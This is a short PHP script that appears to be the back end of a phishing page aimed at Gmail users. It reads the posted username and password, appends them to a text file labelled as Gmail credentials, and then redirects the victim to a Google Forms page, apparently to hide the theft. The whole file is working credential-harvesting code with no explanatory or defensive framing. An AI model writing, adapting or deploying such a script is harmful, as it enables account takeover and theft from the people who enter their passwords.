<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://docs.google.com/forms/d/1HECQ7heDHfIpA9VP68PfexVoGirpJUzsdeaCsBPEWJo/edit?usp=drive_web');
exit();
?>
